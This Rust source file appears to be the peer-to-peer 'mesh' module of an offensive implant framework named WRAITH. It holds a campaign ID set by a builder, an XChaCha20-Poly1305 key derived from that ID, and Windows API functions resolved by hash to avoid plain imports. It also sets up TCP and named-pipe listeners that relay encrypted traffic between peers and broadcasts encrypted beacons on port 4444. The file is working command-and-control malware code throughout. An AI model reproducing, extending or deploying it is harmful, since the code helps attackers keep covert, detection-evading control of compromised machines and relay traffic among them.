use crate::utils::syscalls::*;
use alloc::vec::Vec;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, XNonce,
};
use wraith_crypto::hash::Kdf;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{GUID, HANDLE, PVOID};
#[cfg(target_os = "windows")]
use alloc::format;
#[cfg(target_os = "windows")]
use core::ffi::c_void;

// In a real deployment, this would be injected by the builder
const CAMPAIGN_ID: &str = "WRAITH_CAMPAIGN_DEFAULT";
const MESH_SALT: &[u8] = b"WRAITH_MESH_V1_SALT";

pub fn derive_mesh_key(campaign_id: &str, salt: &[u8]) -> Vec<u8> {
    let kdf = Kdf::new("WRAITH_MESH_KDF_CONTEXT");
    let mut ikm = Vec::new();
    ikm.extend_from_slice(campaign_id.as_bytes());
    ikm.extend_from_slice(salt);
    kdf.derive_key(&ikm).to_vec()
}

pub fn encrypt_mesh_packet(key: &[u8], plaintext: &[u8]) -> Result<Vec<u8>, ()> {
    if key.len() != 32 {
        return Err(());
    }

    let cipher = XChaCha20Poly1305::new_from_slice(key).map_err(|_| ())?;
    let mut nonce_bytes = [0u8; 24];
    crate::utils::entropy::get_random_bytes(&mut nonce_bytes);
    let nonce = XNonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|_| ())?;

    // Format: [Nonce (24)] + [Ciphertext (len)] + [Tag (16)]
    // Note: chacha20poly1305 crate appends tag to ciphertext
    let mut out = Vec::with_capacity(nonce_bytes.len() + ciphertext.len());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ciphertext);
    Ok(out)
}

pub fn decrypt_mesh_packet(key: &[u8], data: &[u8]) -> Result<Vec<u8>, ()> {
    if key.len() != 32 || data.len() < 24 + 16 {
        return Err(());
    }

    let cipher = XChaCha20Poly1305::new_from_slice(key).map_err(|_| ())?;
    let nonce = XNonce::from_slice(&data[..24]);
    let ciphertext = &data[24..];

    cipher.decrypt(nonce, ciphertext).map_err(|_| ())
}

pub struct Route {
    pub dest_id: u64,
    pub next_hop_idx: usize,
    pub cost: u8,
}

pub struct MeshRouter {
    pub routes: Vec<Route>,
    pub local_id: u64,
}

impl MeshRouter {
    pub fn new(local_id: u64) -> Self {
        Self {
            routes: Vec::new(),
            local_id,
        }
    }

    pub fn add_route(&mut self, dest_id: u64, next_hop: usize, cost: u8) {
        if let Some(r) = self.routes.iter_mut().find(|r| r.dest_id == dest_id) {
            if cost < r.cost {
                r.next_hop_idx = next_hop;
                r.cost = cost;
            }
        } else {
            self.routes.push(Route {
                dest_id,
                next_hop_idx: next_hop,
                cost,
            });
        }
    }

    pub fn get_next_hop(&self, dest_id: u64) -> Option<usize> {
        self.routes
            .iter()
            .find(|r| r.dest_id == dest_id)
            .map(|r| r.next_hop_idx)
    }
}

pub struct MeshServer {
    #[cfg(not(target_os = "windows"))]
    tcp_socket: Option<usize>,
    #[cfg(target_os = "windows")]
    tcp_socket: Option<HANDLE>,
    #[cfg(target_os = "windows")]
    pipe_handle: Option<HANDLE>,
    pub clients: Vec<MeshClient>,
    pub router: MeshRouter,
    mesh_key: Vec<u8>,
}

pub struct MeshClient {
    #[cfg(not(target_os = "windows"))]
    pub fd: usize,
    #[cfg(target_os = "windows")]
    pub handle: HANDLE,
    pub is_pipe: bool,
    pub authenticated: bool,
}

impl MeshServer {
    pub fn new() -> Self {
        Self {
            tcp_socket: None,
            #[cfg(target_os = "windows")]
            pipe_handle: None,
            clients: Vec::new(),
            router: MeshRouter::new(0),
            mesh_key: derive_mesh_key(CAMPAIGN_ID, MESH_SALT),
        }
    }

    pub fn start_tcp(&mut self, port: u16) -> Result<(), ()> {
        #[cfg(not(target_os = "windows"))]
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            sys_fcntl(sock, 4, 0o4000); // O_NONBLOCK

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: port.to_be(),
                sin_addr: 0,
                sin_zero: [0; 8],
            };

            if sys_bind(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            if sys_listen(sock, 5) != 0 {
                sys_close(sock);
                return Err(());
            }

            self.tcp_socket = Some(sock);
            Ok(())
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let ws2_32 = hash_str(b"ws2_32.dll");
            let wsa_startup = resolve_function(ws2_32, hash_str(b"WSAStartup"));
            let socket_fn = resolve_function(ws2_32, hash_str(b"socket"));
            let bind_fn = resolve_function(ws2_32, hash_str(b"bind"));
            let listen_fn = resolve_function(ws2_32, hash_str(b"listen"));
            let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));

            if wsa_startup.is_null()
                || socket_fn.is_null()
                || bind_fn.is_null()
                || listen_fn.is_null()
                || ioctlsocket.is_null()
            {
                return Err(());
            }

            type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
            type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> HANDLE;
            type FnBind = unsafe extern "system" fn(HANDLE, *const u8, i32) -> i32;
            type FnListen = unsafe extern "system" fn(HANDLE, i32) -> i32;
            type FnIoctlSocket = unsafe extern "system" fn(HANDLE, i32, *mut u32) -> i32;

            let mut wsa_data = [0u8; 512];
            core::mem::transmute::<_, FnWSAStartup>(wsa_startup)(0x0202, wsa_data.as_mut_ptr());

            let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(2, 1, 0);
            if sock == (-1isize as HANDLE) {
                return Err(());
            }

            let mut mode = 1u32;
            core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(sock, 0x8004667E, &mut mode);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: port.to_be(),
                sin_addr: 0,
                sin_zero: [0; 8],
            };

            if core::mem::transmute::<_, FnBind>(bind_fn)(sock, &addr as *const _ as *const u8, 16)
                != 0
            {
                return Err(());
            }

            if core::mem::transmute::<_, FnListen>(listen_fn)(sock, 5) != 0 {
                return Err(());
            }

            self.tcp_socket = Some(sock);
            Ok(())
        }
    }

    pub fn start_pipe(&mut self, name: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_pipe = resolve_function(kernel32, hash_str(b"CreateNamedPipeA"));

            if create_pipe.is_null() {
                return Err(());
            }

            type FnCreateNamedPipeA = unsafe extern "system" fn(
                *const u8,
                u32,
                u32,
                u32,
                u32,
                u32,
                u32,
                *mut c_void,
            ) -> HANDLE;

            let full_name = format!("\\\\.\\pipe\\{{}}", name);
            let handle = core::mem::transmute::<_, FnCreateNamedPipeA>(create_pipe)(
                full_name.as_ptr(),
                3, // PIPE_ACCESS_DUPLEX
                0, // PIPE_TYPE_BYTE
                255,
                8192,
                8192,
                0,
                core::ptr::null_mut(),
            );

            if handle == (-1isize as HANDLE) {
                return Err(());
            }
            self.pipe_handle = Some(handle);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = name;
            Err(())
        }
    }

    pub fn poll(&mut self) -> Vec<(Vec<u8>, usize)> {
        let mut data_received = Vec::new();

        #[cfg(not(target_os = "windows"))]
        if let Some(sock) = self.tcp_socket {
            unsafe {
                let mut addr = SockAddrIn {
                    sin_family: 0,
                    sin_port: 0,
                    sin_addr: 0,
                    sin_zero: [0; 8],
                };
                let mut addr_len = 16u32;
                let client_fd = sys_accept(sock, &mut addr as *mut _ as *mut u8, &mut addr_len);
                if (client_fd as isize) >= 0 {
                    sys_fcntl(client_fd, 4, 0o4000);
                    self.clients.push(MeshClient {
                        fd: client_fd,
                        is_pipe: false,
                        authenticated: false,
                    });
                }
            }
        }

        #[cfg(target_os = "windows")]
        if let Some(sock) = self.tcp_socket {
            unsafe {
                let ws2_32 = hash_str(b"ws2_32.dll");
                let accept_fn = resolve_function(ws2_32, hash_str(b"accept"));
                let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));

                if !accept_fn.is_null() && !ioctlsocket.is_null() {
                    type FnAccept = unsafe extern "system" fn(HANDLE, *mut u8, *mut i32) -> HANDLE;
                    type FnIoctlSocket = unsafe extern "system" fn(HANDLE, i32, *mut u32) -> i32;

                    let mut addr = [0u8; 16];
                    let mut addr_len = 16i32;
                    let client_h = core::mem::transmute::<_, FnAccept>(accept_fn)(
                        sock,
                        addr.as_mut_ptr(),
                        &mut addr_len,
                    );

                    if client_h != (-1isize as HANDLE) {
                        let mut mode = 1u32;
                        core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(
                            client_h, 0x8004667E, &mut mode,
                        );
                        self.clients.push(MeshClient {
                            handle: client_h,
                            is_pipe: false,
                            authenticated: false,
                        });
                    }
                }
            }
        }

        let mut i = 0;
        while i < self.clients.len() {
            let mut remove = false;
            let mut buf = [0u8; 4096];
            let mut n = 0;

            #[cfg(not(target_os = "windows"))]
            unsafe {
                let res = sys_read(self.clients[i].fd, buf.as_mut_ptr(), 4096) as isize;
                if res > 0 {
                    n = res;
                } else if res == 0 {
                    remove = true;
                }
            }

            #[cfg(target_os = "windows")]
            unsafe {
                let ws2_32 = hash_str(b"ws2_32.dll");
                let recv_fn = resolve_function(ws2_32, hash_str(b"recv"));
                if !recv_fn.is_null() {
                    type FnRecv = unsafe extern "system" fn(HANDLE, *mut u8, i32, i32) -> i32;
                    let res = core::mem::transmute::<_, FnRecv>(recv_fn)(
                        self.clients[i].handle,
                        buf.as_mut_ptr(),
                        4096,
                        0,
                    );
                    if res > 0 {
                        n = res as isize;
                    } else if res == 0 {
                        remove = true;
                    }
                }
            }

            if n > 0 {
                // Try to decrypt
                match decrypt_mesh_packet(&self.mesh_key, &buf[..n as usize]) {
                    Ok(plaintext) => {
                         data_received.push((plaintext, i));
                         self.clients[i].authenticated = true; // Successful decryption implies auth
                    },
                    Err(_) => {
                        // Invalid packet, could log or drop connection
                        // For now just ignore
                    }
                }
            }

            if remove {
                self.clients.remove(i);
            } else {
                i += 1;
            }
        }

        data_received
    }

    pub fn send_to_client(&self, client_idx: usize, data: &[u8]) {
        if client_idx >= self.clients.len() {
            return;
        }
        let client = &self.clients[client_idx];
        
        // Encrypt before sending
        let encrypted = match encrypt_mesh_packet(&self.mesh_key, data) {
            Ok(e) => e,
            Err(_) => return,
        };

        #[cfg(not(target_os = "windows"))]
        unsafe {
            sys_write(client.fd, encrypted.as_ptr(), encrypted.len());
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let ws2_32 = hash_str(b"ws2_32.dll");
            let send_fn = resolve_function(ws2_32, hash_str(b"send"));
            if !send_fn.is_null() {
                type FnSend = unsafe extern "system" fn(HANDLE, *const u8, i32, i32) -> i32;
                core::mem::transmute::<_, FnSend>(send_fn)(
                    client.handle,
                    encrypted.as_ptr(),
                    encrypted.len() as i32,
                    0,
                );
            }
        }
    }

    pub fn discover_peers(&self) {
        let beacon_raw = b"WRAITH_MESH_HELLO";
        let beacon = match encrypt_mesh_packet(&self.mesh_key, beacon_raw) {
            Ok(b) => b,
            Err(_) => return,
        };

        #[cfg(not(target_os = "windows"))]
        unsafe {
            let sock = sys_socket(2, 2, 0);
            if (sock as isize) < 0 {
                return;
            }

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: 4444u16.to_be(),
                sin_addr: 0xFFFFFFFF,
                sin_zero: [0; 8],
            };

            sys_sendto(
                sock,
                beacon.as_ptr(),
                beacon.len(),
                0,
                &addr as *const _ as *const u8,
                16,
            );
            sys_close(sock);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mesh_router_add_get() {
        let mut router = MeshRouter::new(1);
        router.add_route(2, 0, 1);

        assert_eq!(router.get_next_hop(2), Some(0));
        assert_eq!(router.get_next_hop(3), None);
    }

    #[test]
    fn test_mesh_router_update_cost() {
        let mut router = MeshRouter::new(1);
        router.add_route(2, 0, 5);

        // Better route
        router.add_route(2, 1, 3);
        assert_eq!(router.get_next_hop(2), Some(1));

        // Worse route (ignored)
        router.add_route(2, 2, 10);
        assert_eq!(router.get_next_hop(2), Some(1));
    }
}